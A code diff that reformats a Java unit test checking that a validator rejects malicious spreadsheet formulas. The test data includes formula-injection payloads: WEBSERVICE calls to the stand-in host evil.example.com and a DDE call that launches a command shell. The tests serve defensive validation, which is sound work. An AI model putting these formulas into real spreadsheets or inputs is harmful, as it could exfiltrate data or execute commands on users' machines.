@@ -115,8 +115,7 @@ class ProtocolResidualCoverageTest {
     assertThrows(
         IllegalArgumentException.class,
         () ->
-            new DataValidationRuleInput.CustomFormula(
-                "WEBSERVICE(\"https://evil.example.com\")"));
+            new DataValidationRuleInput.CustomFormula("WEBSERVICE(\"https://evil.example.com\")"));
     assertThrows(
         IllegalArgumentException.class,
         () ->
@@ -155,7 +154,9 @@ class ProtocolResidualCoverageTest {
         () -> new FormulaUdfFunctionInput("MY_FUNC", 0, 0, "DDE(\"cmd\",\"/C calc\",\"\")"));
     assertThrows(
         IllegalArgumentException.class,
-        () -> new FormulaUdfFunctionInput("MY_FUNC", 0, 0, "WEBSERVICE(\"https://evil.example.com\")"));
+        () ->
+            new FormulaUdfFunctionInput(
+                "MY_FUNC", 0, 0, "WEBSERVICE(\"https://evil.example.com\")"));
   }
 
   @Test
